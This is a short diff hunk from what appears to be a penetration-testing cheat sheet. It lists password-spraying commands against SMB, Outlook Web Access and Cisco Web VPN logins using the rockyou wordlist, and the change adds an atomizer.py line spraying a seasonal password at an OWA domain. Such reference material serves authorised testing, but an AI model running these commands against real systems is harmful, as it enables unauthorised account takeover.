@@ -72,7 +72,7 @@
 |spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
 |spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
 |spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
-
+|./atomizer.py owa contoso.com 'Fall2018' emails.txt|
 
 
 ### Active Directory Enumeration 
